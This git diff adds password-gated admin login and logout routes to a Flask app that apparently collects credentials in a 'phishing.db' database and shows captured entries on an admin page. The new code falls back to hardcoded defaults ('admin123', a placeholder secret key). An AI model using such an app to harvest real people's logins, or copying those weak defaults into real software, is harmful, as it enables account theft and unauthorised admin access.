@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, redirect
+from flask import Flask, render_template, request, redirect, session, url_for
 from flask_sqlalchemy import SQLAlchemy
 from datetime import datetime
 import qrcode
@@ -10,6 +10,10 @@ app = Flask(__name__)
 # Fix for proxies (like Railway) to ensure correct URLs are generated
 app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
 CORS(app)
+
+# Session configuration for admin login
+app.secret_key = os.environ.get("SECRET_KEY", "your_secret_key_here")
+ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")
 
 # Database configuration
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///phishing.db'
@@ -212,10 +216,30 @@ def thankyou():
 # ---------------------------
 @app.route("/admin")
 def admin():
+    if not session.get("admin_logged_in"):
+        return redirect(url_for("admin_login"))
+        
     all_data = CredentialEvent.query.all()
-    mobile_data = [d for d in all_data if d.page == 'mobile_verify']
-    other_data = [d for d in all_data if d.page != 'mobile_verify']
+    mobile_data = [d for d in all_data if d.page == 'mobile_verify_automated']
+    other_data = [d for d in all_data if d.page != 'mobile_verify_automated']
     return render_template("admin.html", mobile_data=mobile_data, other_data=other_data)
+
+@app.route("/admin/login", methods=["GET", "POST"])
+def admin_login():
+    if request.method == "POST":
+        password = request.form.get("password")
+        if password == ADMIN_PASSWORD:
+            session["admin_logged_in"] = True
+            return redirect(url_for("admin"))
+        else:
+            return render_template("admin_login.html", error="Invalid Password")
+            
+    return render_template("admin_login.html")
+
+@app.route("/admin/logout")
+def admin_logout():
+    session.pop("admin_logged_in", None)
+    return redirect(url_for("admin_login"))
 
 
 @app.route("/platform_submit", methods=["POST"])
